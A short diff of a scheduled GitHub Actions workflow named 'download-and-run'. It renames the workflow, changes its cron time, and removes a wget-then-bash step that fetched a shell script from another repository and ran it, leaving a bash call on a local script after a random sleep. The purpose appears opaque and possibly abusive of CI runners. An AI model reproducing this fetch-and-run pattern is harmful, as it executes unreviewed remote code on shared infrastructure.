@@ -1,7 +1,7 @@
-name: nine
+name: ten
 on:
   schedule:
-    - cron: '1 */2 * * *' # 
+    - cron: '16 */2 * * *' # 
 jobs:
   download-and-run:
     runs-on: ubuntu-latest
@@ -19,5 +19,4 @@ jobs:
           cp htdocs/$file/* ./
           done
           sleep $((RANDOM % 10 + 1))m
-          wget -O drive333.sh https://raw.githubusercontent.com/tuhvvvvvy/0127/main/.github/workflows/drive333333.sh
-          bash drive333.sh
+          bash drive33311.sh
